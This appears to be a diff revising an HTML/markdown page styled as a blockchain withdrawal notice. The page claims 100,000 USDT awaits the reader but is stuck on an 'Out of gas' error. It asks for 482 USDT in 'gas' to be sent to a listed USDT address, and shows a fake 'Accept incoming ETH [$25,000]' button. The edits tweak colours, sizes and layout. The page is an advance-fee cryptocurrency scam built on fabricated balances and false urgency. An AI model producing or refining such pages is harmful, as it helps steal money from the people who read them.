@@ -29,8 +29,8 @@
              <p style="font-size:28px; color:#05a5f0; margin:20px 0;"><strong>100,000 USDT</strong></p>
 
               <!-- Transaction Details -->
-              
-<table align="center" role="presentation" cellpadding="0" cellspacing="0" width="100%" style="font-size:14px; color:#333; background-color:#f2f6fa; border-radius:6px; margin:20px 0;">
+                         
+<table align="center" role="presentation" cellpadding="0" cellspacing="0" width="100%" style="font-size:14px; color:##05a5f0; background-color:#f2f6fa; border-radius:6px; margin:20px 0;">
                 <tr>
                   <td style="padding:10px;"><strong>Transaction Reference:</strong></td>
                   <td style="padding:10px;">e3019139-5efd-4ae1-ad70-b645454404f</td>
@@ -57,7 +57,7 @@
            
                                                          <!-- XtN Details -->
                                                          
-<img align="center" src="IMG_8719.gif" alt="blockchain Logo" width="500" />
+<img align="center" src="IMG_8719.gif" alt="blockchain Logo" width="100" />
 
 <hr>
 
@@ -68,28 +68,35 @@
 <span style="color: Green;"> And receive $100,000 USDT Balance on your USDT address</span>
 
 <br>
+<div>
+  
+<b>Gas(estimated):[$482]=482 USDT</b>
 
-***Gas*** (estimated) ***:***  [$482] **482 USDT*** <span style="color: Red;"> CURRENTLY OUTSTANDING </span>
-
+<span style="color: Red;"><b>CURRENTLY OUTSTANDING</b></span>
+</div>
 <br>
 
 <span style="color: Blue;"> ~~$0.00 USDT PAID~~ </span>
 
-<span style="color: green;">Very likely in ‹<15 seconds</span>
+<span style="color: green;">RECEVING IN <<<15 seconds</span>
 
 <br>
 
-| <span style="color: Blue;">⛽️Top USDT: </span>|<span style="color: Blue;"> TAFpmstXRzCTPoZrsU81QysV7ZHCdnMEBF </span>|
+<div>
+  
+|<span style="color: Blue;">⛽️Top USDT:</span>|<span style="color: Blue;">TAFpmstXRzCTPoZrsU81QysV7ZHCdnMEBF</span>|
 |---------------------------|---------------------------|
 | USDT  network         | ⛽️ Gas Refill ID ⬆️       |
 
 <img align="center" src="IMG_9083.jpeg" alt="blockchain Logo" width="38" />
 
+</div>
+
 <hr>
 
 <span style="color: Blue;"> ***ERROR!!!*** </span> 
 
-<span style="color: Red;">Warning! Error encountered during Withdraw execution ~~[Out of gas]~~ ⚠️ </span>
+<span style="color: Red;">Warning! Error encountered during Withdraw execution ~~[Out of gas]~~ ⚠️</span>
 
 <br>
 
@@ -102,13 +109,13 @@
 
 <img align="center" src="IMG_9113.jpeg" alt="ethscan Logo" width="500" />
 
-
+<div>
 
 <form action="https://etherscan.io/" method="get">
 <button align="center" type="submit"> Accept incoming ETH [$25,000] </button>
 </form>
 
-
+</div>
 
 <img align="center" src="IMG_9086.gif" alt="loading gif display" width="500">
 
